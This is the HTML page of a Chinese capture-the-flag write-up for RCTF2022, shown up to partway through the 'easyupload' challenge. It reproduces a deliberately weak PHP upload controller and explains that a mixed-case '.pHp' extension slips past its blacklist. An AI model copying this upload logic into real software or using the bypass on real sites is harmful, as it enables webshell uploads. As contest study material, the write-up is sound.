<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="学到很多">
<meta property="og:type" content="article">
<meta property="og:title" content="2022RCTF">
<meta property="og:url" content="https://ttoc.fun/2022RCTF/index.html">
<meta property="og:site_name" content="Ttoc&#39;s blog">
<meta property="og:description" content="学到很多">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230122145933429.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230122163200935.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230122195735469.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230122195835984.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230122213729640.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230122210900608.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230122210957493.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230122164102078.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230122164115830.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230304225854115.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230305002520151.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230305005514205.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230217204716995.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230123144129416.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230123151457117.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230123153904078.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230123154032645.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230124131633821.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230125004553248.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230312163758682.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230312223454421.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230312224705119.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230312224941575.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230314163249778.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230315000016107.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230315210955814.png">
<meta property="og:image" content="https://ttoc.fun/2022RCTF/image-20230315222627587.png">
<meta property="article:published_time" content="2023-02-13T15:21:49.888Z">
<meta property="article:modified_time" content="2023-08-06T08:02:03.811Z">
<meta property="article:author" content="Ttoc">
<meta property="article:tag" content="Game">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ttoc.fun/2022RCTF/image-20230122145933429.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>2022RCTF</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.2"><style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />



<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <li><a href="/">首页</a></li>
          <li><a href="/archives/">文章</a></li>
        <li><a href="/search/">搜索</a></li>
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2022DASCTF%20X%20GFCTF%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ttoc.fun/2022RCTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ttoc.fun/2022RCTF/&text=2022RCTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ttoc.fun/2022RCTF/&title=2022RCTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ttoc.fun/2022RCTF/&is_video=false&description=2022RCTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2022RCTF&body=Check out this article: https://ttoc.fun/2022RCTF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ttoc.fun/2022RCTF/&title=2022RCTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ttoc.fun/2022RCTF/&title=2022RCTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ttoc.fun/2022RCTF/&title=2022RCTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ttoc.fun/2022RCTF/&title=2022RCTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ttoc.fun/2022RCTF/&name=2022RCTF&description=&lt;p&gt;&lt;code&gt;学到很多&lt;/code&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ttoc.fun/2022RCTF/&t=2022RCTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCTF2022"><span class="toc-number">1.</span> <span class="toc-text">RCTF2022</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyupload"><span class="toc-number">1.1.</span> <span class="toc-text">easyupload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.1.1.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#libmbfl%E6%89%93%E5%88%86"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">libmbfl打分</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E4%B8%8A"><span class="toc-number">1.1.2.</span> <span class="toc-text">综上</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezruoyi"><span class="toc-number">1.2.</span> <span class="toc-text">ezruoyi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrettierOnline"><span class="toc-number">1.3.</span> <span class="toc-text">PrettierOnline</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#index-js"><span class="toc-number">1.3.1.</span> <span class="toc-text">index.js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fw-js"><span class="toc-number">1.3.2.</span> <span class="toc-text">fw.js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#js-payload"><span class="toc-number">1.3.3.</span> <span class="toc-text">js payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezbypass"><span class="toc-number">1.4.</span> <span class="toc-text">ezbypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#password%E5%8F%82%E6%95%B0"><span class="toc-number">1.4.1.</span> <span class="toc-text">password参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ognl-%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%BC%95%E7%94%A8%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">Ognl 注入绕过引用过滤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc%E5%8F%82%E6%95%B0"><span class="toc-number">1.4.2.</span> <span class="toc-text">poc参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#type%E5%8F%82%E6%95%B0"><span class="toc-number">1.4.3.</span> <span class="toc-text">type参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yourclasses%E5%8F%82%E6%95%B0"><span class="toc-number">1.4.4.</span> <span class="toc-text">yourclasses参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#classes-0-classes-1"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">classes[0]&amp;classes[1]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#classes-2-classes-3"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">classes[2]&amp;classes[3]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">1.4.5.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filecheacker-mini"><span class="toc-number">1.5.</span> <span class="toc-text">filecheacker_mini</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-b%E8%A7%A3%E6%9E%90-%E5%90%8E%E5%86%85%E5%AE%B9%E6%98%BE%E7%A4%BA"><span class="toc-number">1.5.1.</span> <span class="toc-text">file -b解析#!后内容显示</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filecheacker-pro"><span class="toc-number">1.6.</span> <span class="toc-text">filecheacker_pro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filecheacker-pro-max"><span class="toc-number">1.7.</span> <span class="toc-text">filecheacker_pro_max</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.7.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6"><span class="toc-number">1.7.2.</span> <span class="toc-text">构造利用文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3"><span class="toc-number">1.8.</span> <span class="toc-text">C3</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>


    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        2022RCTF
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Ttoc</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-02-13T15:21:49.888Z" class="dt-published" itemprop="datePublished">2023-02-13</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">网络安全学习</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Game/" rel="tag">Game</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p><code>学到很多</code></p>
<span id="more"></span>

<h1 id="RCTF2022"><a href="#RCTF2022" class="headerlink" title="RCTF2022"></a>RCTF2022</h1><h2 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h2><blockquote>
<p>附件</p>
<p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/file/task/0e2ca001-097f-437c-b5ae-a9e04773b9bc.tar">https://adworld.xctf.org.cn/media/file/task/0e2ca001-097f-437c-b5ae-a9e04773b9bc.tar</a></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122145933429.png"><img src="/2022RCTF/image-20230122145933429.png" alt="image-20230122145933429"></a></p>
<p>这是一个文件上传的题目，题目开始给出了题目附件，先查看一下源码查看上传文件过滤哪些东西</p>
<p>核心就是一个<code>UploadController.php</code>文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Filesystem</span>\<span class="title">Path</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Annotation</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Bundle</span>\<span class="title">FrameworkBundle</span>\<span class="title">Controller</span>\<span class="title">AbstractController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;BASE64&quot;</span>,<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext_blacklist = [</span><br><span class="line">            <span class="string">&quot;php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ini&quot;</span>,</span><br><span class="line">            <span class="string">&quot;phtml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;htaccess&quot;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_blacklist = [<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;handler&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalid</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;error occurs: <span class="subst">$msg</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#[Route</span>(<span class="string">&#x27;/&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;upload&#x27;</span>)<span class="meta">]</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadHtml</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span> = @<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span> == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">                <span class="comment">//&#x27;&lt;p&gt;Before start you should know that it\&#x27;s not a good challenge.You can\&#x27;t get anything from this challenge.If you hate this challenge, just skip plz. &lt;/p&gt;&lt;p&gt;这道题并不是一道好题，你不会从这道题上获得任何东西。如果你讨厌这道题就直接跳过吧。&lt;/p&gt;&#x27;</span></span><br><span class="line">                <span class="variable">$uploadHtml</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="variable">$charset</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$content</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$charset</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking invalid format.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$ext</span> = <span class="title class_">Path</span>::<span class="title function_ invoke__">getExtension</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking path travel&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;ext_blacklist <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$ext</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$ext</span> extension.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$request</span>-&gt;server-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;<span class="subst">$dir</span>/upload/&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;upload success&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到过滤包含了<code>后缀过滤</code>和<code>文件内容过滤</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;BASE64&quot;</span>,<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext_blacklist = [</span><br><span class="line">            <span class="string">&quot;php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ini&quot;</span>,</span><br><span class="line">            <span class="string">&quot;phtml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;htaccess&quot;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_blacklist = [<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;handler&quot;</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>后缀名黑名单</strong>过滤代码，过滤了<code>php,ini,phtml,htaccess</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking path travel&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;ext_blacklist <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$ext</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$ext</span> extension.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里的这里是用<code>strstr()</code>进行匹配，而<code>strstr()</code>是区分大小写的，所以这里可以用<code>.pHp</code>，或者<code>.PHP</code>进行绕过对<code>.php</code>的过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;<span class="subst">$dir</span>/upload/&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]));</span><br></pre></td></tr></table></figure>

<p>代码最后可以看到后缀名被<code>strtolower()</code>处理，转化为小写，但是这里已经不影响，因为前面已经绕过了过滤</p>
</blockquote>
<blockquote>
<p><strong>文件内容黑名单</strong>明确了<code>&quot;&lt;?&quot;, &quot;php&quot;, &quot;handler&quot;</code></p>
<p>可以看到代码中对文件内容的判断，其中涉及了<code>mb_detect_encoding()</code>函数</p>
<blockquote>
<p><code>mb_detect_encoding()</code>：从有序的候选列表中 检测字符串 最可能的字符编码。</p>
